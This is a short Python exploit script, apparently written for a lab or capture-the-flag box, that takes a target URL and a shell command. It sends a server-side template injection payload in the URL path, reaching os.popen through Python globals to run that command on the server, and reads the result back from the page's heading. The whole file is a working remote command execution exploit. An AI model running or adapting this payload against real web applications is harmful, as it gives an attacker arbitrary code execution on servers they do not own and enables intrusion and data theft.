import requests
from lxml import html
import sys

GREEN = "\033[32m"
RED = "\033[91m"
RESET = "\033[0m"

if len(sys.argv) != 3:
    print(f"[-] Usage:\n\tpython3 {sys.argv[0]} <URL> <COMMAND>")
    sys.exit(1)
else:
    url = sys.argv[1]
    command = sys.argv[2]

request = requests.get(url + "/" + "{{self.__init__.__globals__.__builtins__.__import__('os').popen('" + command + "').read()}}")
html_ = html.fromstring(request.content)
command_output = html_.xpath('//h1/text()')[0].split('/')[-1]
print(command_output)
